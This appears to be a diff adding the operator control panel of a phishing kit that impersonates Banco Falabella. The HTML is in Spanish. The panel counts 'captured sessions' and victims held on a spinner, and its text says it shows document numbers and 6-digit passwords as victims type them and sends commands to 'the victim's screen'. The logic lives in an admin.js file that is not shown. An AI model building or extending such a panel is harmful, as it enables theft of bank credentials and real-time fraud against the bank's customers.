@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Panel de Monitoreo en Vivo - Banco Falabella</title>
+  <link rel="icon" href="assets/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/admin.css">
+</head>
+<body>
+  <div class="adm-app">
+    <!-- Sidebar / Top Header Navigation -->
+    <header class="adm-header">
+      <div class="adm-container adm-flex-between">
+        <div class="adm-brand">
+          <img src="assets/logo.svg" alt="Banco Falabella" width="130">
+          <span class="adm-badge-live">
+            <span class="adm-pulse-dot"></span>
+            PANEL DE CONTROL EN VIVO
+          </span>
+        </div>
+        <div class="adm-top-actions">
+          <button type="button" class="adm-btn adm-btn-soft" id="btn-clear-all">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+            Limpiar Todo
+          </button>
+          <a href="/" class="adm-btn adm-btn-primary" target="_blank">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+            Abrir Web Falabella
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Admin Container -->
+    <main class="adm-main">
+      <div class="adm-container">
+        
+        <!-- Stats Summary Bar -->
+        <div class="adm-stats-grid">
+          <div class="adm-stat-card">
+            <span class="adm-stat-title">Sesiones Capturadas</span>
+            <strong class="adm-stat-value" id="stat-total">0</strong>
+            <small class="adm-stat-sub">Registros acumulados</small>
+          </div>
+          <div class="adm-stat-card adm-stat-active">
+            <span class="adm-stat-title">En Espera (Spinner)</span>
+            <strong class="adm-stat-value" id="stat-waiting">0</strong>
+            <small class="adm-stat-sub">Esperando comando del panel</small>
+          </div>
+          <div class="adm-stat-card">
+            <span class="adm-stat-title">Última Actividad</span>
+            <strong class="adm-stat-value" id="stat-last-time">--:--</strong>
+            <small class="adm-stat-sub" id="stat-last-doc">Sin ingresos recientes</small>
+          </div>
+        </div>
+
+        <!-- Live Feed Control Section -->
+        <div class="adm-card">
+          <div class="adm-card-header adm-flex-between">
+            <div>
+              <h2>Monitoreo de Credenciales y Control de Comandos</h2>
+              <p>Visualiza en tiempo real los datos ingresados y envía instrucciones directamente a la pantalla de la víctima.</p>
+            </div>
+            <button type="button" class="adm-btn adm-btn-soft adm-btn-sm" id="btn-refresh">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+              Actualizar
+            </button>
+          </div>
+
+          <div class="adm-card-body">
+            <!-- Grid of Live Sessions -->
+            <div class="adm-feed-grid" id="adm-feed-container">
+              <!-- Empty state default -->
+              <div class="adm-empty-state" id="adm-empty-state">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="12" cy="12" r="3"/></svg>
+                <h3>Esperando nuevos ingresos...</h3>
+                <p>Cuando un usuario ingrese su documento y clave de 6 dígitos en la pantalla de Banco Falabella, aparecerá aquí al instante con sus opciones de comando.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="js/admin.js"></script>
+</body>
+</html>
